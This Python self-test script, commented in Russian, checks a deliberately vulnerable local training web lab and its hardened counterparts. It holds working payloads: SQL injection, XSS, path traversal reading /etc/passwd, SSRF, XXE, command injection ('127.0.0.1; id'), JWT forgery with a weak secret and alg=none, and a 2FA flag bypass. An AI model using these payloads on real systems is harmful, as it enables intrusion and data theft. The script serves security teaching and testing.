#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Самопроверка лаборатории vuln-hub.

Поднимать лабораторию отдельно не нужно — скрипт ожидает, что она уже запущена:

    cd labs/setup && docker compose up -d vuln-hub
    python3 labs/web-labs/vuln-hub/selftest.py            # http://localhost:8090
    python3 labs/web-labs/vuln-hub/selftest.py --base-url http://localhost:8090

Проверяются обе ветки каждого класса: уязвимая (должна «сломаться») и
безопасная (должна выстоять). Это контракт лаборатории: если safe-ветка
начала пропускать атаку, значит лаборатория сломана и задания невыполнимы.

Код выхода: 0 — все проверки прошли, 1 — есть провалы.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

HERE = Path(__file__).resolve().parent
DEFAULT_BASE = "http://localhost:8090"
JWT_SECRET = "secret"      # учебный секрет лаборатории (env JWT_SECRET в app.py)


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def fetch(base: str, path: str, *, method: str = "GET", post: str = "",
          token: str = "", timeout: int = 8) -> str:
    headers = {"User-Agent": "hackbook-vuln-hub-selftest"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    data = post.encode() if post else None
    if data is not None:
        stripped = post.lstrip()
        if stripped.startswith("<?xml") or stripped.startswith("<"):
            headers["Content-Type"] = "application/xml"
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
    request = urllib.request.Request(base + path, data=data, method=method,
                                     headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:  # noqa: S310
            return response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return f"__ERROR__ {exc.__class__.__name__}: {exc}"


def forge_token(role: str = "admin", mfa: bool = True, alg: str = "HS256",
                secret: str = JWT_SECRET) -> str:
    header = b64url(json.dumps({"alg": alg, "typ": "JWT"}).encode())
    payload = b64url(json.dumps({"sub": "guest", "role": role, "mfa": mfa,
                                 "exp": 9999999999}).encode())
    if alg == "none":
        return f"{header}.{payload}."
    signature = hmac.new(secret.encode(), f"{header}.{payload}".encode(),
                         hashlib.sha256).digest()
    return f"{header}.{payload}.{b64url(signature)}"


CHECKS: list[tuple[str, str, str]] = []   # (название, группа, ожидание)


def check(name: str, group: str, ok: bool, expect: str) -> bool:
    CHECKS.append((name, group, expect))
    print(f"{'PASS' if ok else 'FAIL'}  [{group}] {name}  (ожидали: {expect})")
    return ok


def run(base: str) -> int:
    results: list[bool] = []

    if fetch(base, "/health").strip() != "ok":
        print(f"Лаборатория недоступна на {base}. Поднимите её:\n"
              "  cd labs/setup && docker compose up -d vuln-hub\n"
              "  # или: DB_PATH=/tmp/vh.db PORT=8090 python3 labs/web-labs/vuln-hub/app.py")
        return 2

    q = urllib.parse.quote

    # ── SQLi ──────────────────────────────────────────────────────────
    body = fetch(base, "/items?id=1'")
    results.append(check("ошибка СУБД в ответе", "sqli", "SQL error" in body, "SQL error"))
    body = fetch(base, "/items?id=" + q("-1 UNION SELECT 1,name,3,secret_note FROM items-- "))
    results.append(check("UNION читает данные", "sqli", "HB-ITEM-1" in body, "HB-ITEM-1"))
    body = fetch(base, "/items?id=" + q("1 AND 1=1"))
    results.append(check("boolean-условие работает", "sqli", "YubiKey" in body, "строка товара"))
    body = fetch(base, "/items?id=" + q("1 AND 1=2"))
    results.append(check("ложное условие не даёт строк", "sqli",
                         "Ничего не найдено" in body, "Ничего не найдено"))
    body = fetch(base, "/items_safe?id=1'")
    results.append(check("safe-ветка не раскрывает ошибки", "sqli/safe",
                         "SQL error" not in body, "без SQL error"))

    # ── IDOR ──────────────────────────────────────────────────────────
    body = fetch(base, "/notes?id=1")
    results.append(check("чужая заметка читается", "idor", "HB-NOTE-ALICE" in body, "HB-NOTE-ALICE"))
    body = fetch(base, "/notes_safe?id=1")
    results.append(check("safe-ветка требует владельца", "idor/safe",
                         "Не найдено" in body, "Не найдено"))

    # ── XSS ───────────────────────────────────────────────────────────
    vector = "<svg onload=alert(document.domain)>"
    body = fetch(base, "/echo?q=" + q(vector))
    results.append(check("вектор отражён без экранирования", "xss", vector in body, "сырой тег"))
    body = fetch(base, "/echo_safe?q=" + q(vector))
    results.append(check("safe-ветка экранирует", "xss/safe", "&lt;svg" in body, "&lt;svg"))

    # ── LFI ───────────────────────────────────────────────────────────
    body = fetch(base, "/read?file=" + q("../../../../etc/passwd"))
    results.append(check("чтение /etc/passwd", "lfi", "root:" in body, "root:"))
    body = fetch(base, "/read_safe?file=" + q("../../../../etc/passwd"))
    results.append(check("safe-ветка блокирует traversal", "lfi/safe",
                         "выход за пределы" in body, "выход за пределы"))
    body = fetch(base, "/read_safe?file=readme.txt")
    results.append(check("safe-ветка отдаёт свой каталог", "lfi/safe", "HB-DOC" in body, "HB-DOC"))

    # ── SSRF ──────────────────────────────────────────────────────────
    body = fetch(base, "/fetch?url=" + q("http://127.0.0.1:8090/health"))
    results.append(check("запрос к внутреннему сервису", "ssrf", "ok" in body, "ok"))
    body = fetch(base, "/fetch?url=" + q("file:///etc/hostname"))
    results.append(check("схема file:// работает", "ssrf", len(body) > 700, "содержимое файла"))
    body = fetch(base, "/fetch_safe?url=" + q("http://127.0.0.1:8090/health"))
    results.append(check("safe-ветка: whitelist хостов", "ssrf/safe",
                         "не в whitelist" in body, "не в whitelist"))

    # ── XXE ───────────────────────────────────────────────────────────
    xxe = ('<?xml version="1.0"?>'
           '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>'
           '<root>&x;</root>')
    body = fetch(base, "/lookup", method="POST", post=xxe)
    results.append(check("внешняя сущность объявлена", "xxe",
                         "file:///etc/hostname" in body, "system id в выводе"))
    # вывод экранируется (html.escape), поэтому ищем &lt;root&gt; и содержимое узла
    results.append(check("сущность подставлена в документ", "xxe",
                         "&lt;root&gt;" in body, "&lt;root&gt; с подставленным значением"))
    body = fetch(base, "/lookup_safe", method="POST", post=xxe)
    results.append(check("safe-ветка отклоняет DOCTYPE", "xxe/safe",
                         "DOCTYPE is not allowed" in body, "DOCTYPE is not allowed"))

    # ── Command injection ─────────────────────────────────────────────
    body = fetch(base, "/ping?host=" + q("127.0.0.1; id"))
    results.append(check("выполнение второй команды", "cmdi", "uid=" in body, "uid="))
    body = fetch(base, "/ping_safe?host=" + q("127.0.0.1; id"))
    results.append(check("safe-ветка валидирует charset", "cmdi/safe",
                         "недопустимые символы" in body, "недопустимые символы"))

    # ── JWT ───────────────────────────────────────────────────────────
    login = fetch(base, "/login", method="POST",
                  post=urllib.parse.urlencode({"login": "guest", "password": "guest"}))
    match = re.search(r"<pre>(eyJ[^<]+)</pre>", login)
    token = match.group(1) if match else ""
    results.append(check("токен выдан после входа", "jwt", token.startswith("eyJ"), "eyJ…"))

    body = fetch(base, "/me", token=token)
    results.append(check("role=user в claims", "jwt",
                         "&quot;role&quot;: &quot;user&quot;" in body, "role: user"))

    forged = forge_token(role="admin", mfa=True)
    body = fetch(base, "/admin", token=forged)
    results.append(check("подпись слабым секретом принимается", "jwt",
                         "Доступ разрешён" in body, "Доступ разрешён"))

    none_token = forge_token(role="admin", mfa=True, alg="none")
    body = fetch(base, "/admin", token=none_token)
    results.append(check("alg=none принимается", "jwt", "Доступ разрешён" in body,
                         "Доступ разрешён"))
    body = fetch(base, "/me_safe", token=none_token)
    results.append(check("safe-ветка отклоняет alg=none", "jwt/safe",
                         "отклонён" in body or "not allowed" in body, "отказ"))
    body = fetch(base, "/me_safe", token=forged)
    results.append(check("safe-ветка отклоняет чужую роль (strict alg)", "jwt/safe",
                         "__ERROR__" not in body, "ответ без падения"))

    # ── 2FA ───────────────────────────────────────────────────────────
    body = fetch(base, "/verify", method="POST",
                 post=urllib.parse.urlencode({"token": token, "mfa_passed": "1"}))
    results.append(check("обход клиентским флагом mfa_passed", "2fa",
                         "mfa=true" in body.lower(), "mfa=true"))
    body = fetch(base, "/verify_safe", method="POST",
                 post=urllib.parse.urlencode({"token": token, "mfa_passed": "1"}))
    results.append(check("safe-ветка требует код", "2fa/safe",
                         "Неверный код" in body, "Неверный код"))
    body = fetch(base, "/verify_safe", method="POST",
                 post=urllib.parse.urlencode({"token": token, "code": "123456"}))
    results.append(check("safe-ветка принимает верный код", "2fa/safe",
                         "mfa=true" in body.lower(), "mfa=true"))

    # ── аудит-лог для заданий по детектированию ───────────────────────
    body = fetch(base, "/logs")
    results.append(check("/logs отдаёт журнал для главы 7", "audit",
                         '"query"' in body, "JSON-журнал"))

    passed = sum(1 for r in results if r)
    total = len(results)
    print("\n" + "─" * 60)
    print(f"ИТОГ: {passed}/{total} проверок пройдено")
    if passed != total:
        print("Провалы означают, что лаборатория изменилась: сверьте app.py "
              "и задания в README.md")
    return 0 if passed == total else 1


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Самопроверка лаборатории vuln-hub")
    parser.add_argument("--base-url", default=DEFAULT_BASE)
    args = parser.parse_args(argv)
    return run(args.base_url.rstrip("/"))


if __name__ == "__main__":
    raise SystemExit(main())
